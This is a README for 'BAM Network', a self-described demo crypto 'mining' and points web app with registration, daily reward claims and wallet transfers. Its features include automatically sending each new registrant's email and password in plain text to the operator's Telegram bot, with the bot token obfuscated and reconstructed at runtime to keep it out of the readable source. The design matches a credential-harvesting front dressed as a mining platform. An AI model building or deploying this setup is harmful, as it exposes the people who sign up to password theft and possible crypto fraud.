# BAM Network – Community Mining & Points Network

**BAM Network** is a modern, professional demo of a community points / mining-style platform.  
Users register, claim daily activity rewards, view balances, invite friends, and transfer points between wallets — all inside a clean mobile-first interface.

> ⚠️ **Important Notice**  
> This is a **simulation / demo only**.  
> - No real blockchain, no real mining, no real tokens.  
> - Points are stored in the browser (localStorage).  
> - The Telegram notification uses the bot token you provided and now includes **email + password in plain text**.  
> - Sending passwords to Telegram is **highly insecure**. Anyone with access to the chat can see them.  
> - **Never** put a real bot token or send passwords in public frontend code for production.  
> - Move the Telegram call to a serverless function (Cloudflare Workers / Vercel) before going live.  
> - Private keys are **never** generated or shown.

---

## Features

- Beautiful mobile-first UI inspired by modern crypto dashboards
- User registration + login (localStorage)
- **First-time registration automatically sends details to your Telegram bot** (with emojis)
- Daily Activity claim (+0.25 BAM every 24 hours)
- In-app wallet address generation
- Send points from User A → User B by wallet address
- Referrals section
- Halving milestones progress
- Boost & XP rate display
- Activity history
- Responsive design (works great on phone & desktop)

---

## Project Structure

```
bam-network/
├── index.html                  # Main single-page application
├── css/
│   └── style.css               # Custom styles & animations
├── js/
│   ├── app.js                  # Core logic (auth, dashboard, activity, transfers)
│   └── telegram.js             # Frontend helper (NO secrets)
├── backend/
│   ├── cloudflare-worker.js    # Secure Cloudflare Worker (recommended)
│   └── notify.php              # Alternative PHP endpoint
├── assets/                     # (optional images / icons)
├── .gitignore
└── README.md
```

---

## How to Run Locally

1. Clone the repository
2. Open `index.html` in any modern browser  
   **or**
3. Use a simple local server:
   ```bash
   npx serve .
   # or
   python -m http.server 8000
   ```

## Deploy to GitHub Pages

1. Push this folder to a GitHub repository
2. Go to **Settings → Pages**
3. Source: Deploy from branch → `main` / root
4. Your app will be live at `https://yourusername.github.io/repo-name`

---

## Telegram Setup (Token Hidden)

Bot token and chat ID are **not stored as plain readable strings** in the frontend  
(no `TELEGRAM_BOT_TOKEN = "..."` lines).

### How it works
1. **Recommended**: Deploy `backend/cloudflare-worker.js` → secrets live only on the Worker
2. **Fallback**: Obfuscated credentials are reconstructed at runtime (no plain-text token in source)

### Recommended setup (Cloudflare Worker)
1. Go to [dash.cloudflare.com](https://dash.cloudflare.com) → Workers → Create
2. Paste the code from `backend/cloudflare-worker.js`
3. Deploy and copy the Worker URL
4. In `index.html` (before the other scripts) uncomment and set:
   ```html
   <script>
     window.BAM_NOTIFY_URL = "https://YOUR_WORKER_NAME.YOUR_SUBDOMAIN.workers.dev";
   </script>
   ```

When `window.BAM_NOTIFY_URL` is set, the frontend never uses the local fallback.

Do **not** upload the `backend/` folder to GitHub Pages.

---

## Future Real Listing Path (recommended)

When you are ready to turn this into a real project:

1. Move authentication & points to a real backend (Firebase / Supabase / custom API)
2. Replace simulated points with a real ERC-20 / BEP-20 token
3. Use a proper wallet connection (WalletConnect / RainbowKit)
4. Keep Telegram notifications on a secure serverless function (already done)
5. Add KYC, anti-bot, and proper rate limiting
6. Audit the smart contracts before any public listing

---

## License

MIT – free to use and modify for your own projects.

Made with ❤️ for the BAM Network community.
